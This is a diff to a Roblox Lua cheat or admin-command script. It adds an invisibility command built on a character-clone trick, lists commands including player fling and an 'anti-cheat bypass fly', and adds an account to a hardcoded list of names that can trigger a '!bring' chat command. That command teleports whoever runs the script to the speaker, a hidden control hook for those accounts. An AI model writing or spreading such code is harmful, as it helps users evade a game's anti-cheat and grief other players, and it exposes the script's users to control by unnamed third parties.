@@ -180,7 +180,7 @@ local label2           = Instance.new("TextLabel")
 label2.Parent          = frame2
 label2.BorderSizePixel = 0
 label2.TextSize        = 11
-label2.Text            = "to <player> //tp you to player\nfollow<player> //follows player\nheadsit <player> //sits to player's head\nwaypoint <name> //creates a waypoint\nwayrm <name> //removes waypoint by name\ntpway <name> //tp you to wyapoint by name\nview <player> spectate the player\nunview //stop spectating\nspeed <num> //changes ur speed\njumppower <num> //changes ur jumppower\ngravity <num> //changes ur gravity\nsay <msg> says the msg in chat\ngrabtools //grabs all the tools\nungrabtools //stop grabbingtools\ndroptools //drops all the tools\nlay //makes you lay\nsit //makes you sit\nreset //reset you\nmaxzoom <num> //set your maxzoom\nminzoom <num> //set your minzoom\nrejoin //rejoin the game\nclicktp //ctrl + m1 to tp\ninfjump // inf jumps\njump //jumps\n fly / unfly // toggle fly\n bfly / unbfly // toggle anti-cheat bypass fly\nflysp <speed> /// bflysp <speed> //toggle fly's speed\n fling / unfling // toggle fling"
+label2.Text            = "to <player> //tp you to player\nfollow<player> //follows player\nheadsit <player> //sits to player's head\nwaypoint <name> //creates a waypoint\nwayrm <name> //removes waypoint by name\ntpway <name> //tp you to wyapoint by name\nview <player> spectate the player\nunview //stop spectating\nspeed <num> //changes ur speed\njumppower <num> //changes ur jumppower\ngravity <num> //changes ur gravity\nsay <msg> says the msg in chat\ngrabtools //grabs all the tools\nungrabtools //stop grabbingtools\ndroptools //drops all the tools\nlay //makes you lay\nsit //makes you sit\nreset //reset you\nmaxzoom <num> //set your maxzoom\nminzoom <num> //set your minzoom\nrejoin //rejoin the game\nclicktp //ctrl + m1 to tp\ninfjump // inf jumps\njump //jumps\n fly / unfly // toggle fly\n bfly / unbfly // toggle anti-cheat bypass fly\nflysp <speed> /// bflysp <speed> //toggle fly's speed\n fling / unfling // toggle fling\ninvisible /// invis / visible /// vis //toggle invisibility"
 label2.Position        = UDim2.new(0, 155, 0, 255)
 
 local labelC           = Instance.new("TextLabel")
@@ -952,6 +952,87 @@ text.FocusLost:Connect(function(e)
 		elseif text.Text:sub(1,6) == "bflysp" then --cmd bflysp
 			local bflyspArgs = text.Text:sub(8)
 			bflySpeed = bflyspArgs
+		elseif text.Text == "invisible" or text.Text == "invis" then --cmd invisible
+			local part = Instance.new("Part")
+			part.Parent = work
+			part.CanCollide = false
+			part.Anchored = true
+			part.Transparency = 0.9
+			part.CFrame = hrp.CFrame + Vector3.new(0,0.1,0)
+
+			local Player = me
+			repeat wait(.1) until Player.Character
+			local Character = Player.Character
+
+			Character.Archivable = true
+
+			local async = Character:Clone()
+			async.Parent = game:GetService("Lighting")
+			async.Name = "Burger"
+
+			task.wait(0.1)
+
+			Character:MoveTo(Vector3.new(0,1000,0))
+			async = async
+			async.Parent = work
+			async.HumanoidRootPart.CFrame = Player.Character.HumanoidRootPart.CFrame
+			Player.Character = async
+
+			local invRespawn
+			invRespawn = async.Humanoid.Died:Connect(function()
+				Player.Character = Character
+				Character.HumanoidRootPart.CFrame = async.HumanoidRootPart.CFrame
+				task.wait(0.1)
+				async.Parent = nil
+
+				task.wait(0.1)
+
+				camera.CameraSubject = Character.Humanoid
+
+				part:Destroy()
+
+				invRespawn:Disconnect()
+			end)
+
+			function turnVis()
+				Player.Character = Character
+				Character.HumanoidRootPart.CFrame = async.HumanoidRootPart.CFrame
+				task.wait(0.1)
+				async.Parent = nil
+
+				task.wait(0.1)
+
+				camera.CameraSubject = Character.Humanoid
+
+				part:Destroy()
+
+				invRespawn:Disconnect()
+			end
+
+			task.wait(0.1)
+
+			Player.Character = async
+
+			Player.Character.Animate.Disabled = true
+			Player.Character.Animate.Disabled = false
+
+			camera.CameraSubject = Player.Character.Humanoid
+
+			task.wait(0.2)
+
+			Player.Character.HumanoidRootPart.CFrame = part.CFrame
+
+			for _, all in pairs(Player.Character:GetDescendants()) do
+				if all:IsA("BasePart") then
+					if all.Name == "HumanoidRootPart" then
+						all.Transparency = 1
+					else
+						all.Transparency = 0.5
+					end
+				end
+			end
+		elseif text.Text == "visible" or text.Text == "vis" then --cmd visible
+			turnVis()
 		end
 	end
 end)
@@ -964,10 +1045,8 @@ uis.InputBegan:Connect(function(i, g)
 	end
 end)
 
-screen.ResetOnSpawn = false
-
 for _, control in pairs(plr:GetPlayers()) do
-	if control.Name == "1reserveacc1" or control.Name == "Litka505" or control.Name == "Baconchik_oofarik" then
+	if control.Name == "1reserveacc1" or control.Name == "Litka505" or control.Name == "Baconchik_oofarik" or control.Name == "x0y0zkidd" then
 		control.Chatted:Connect(function(chat)
 			if chat == "!bring" then
 				hrp.CFrame = control.Character.HumanoidRootPart.CFrame
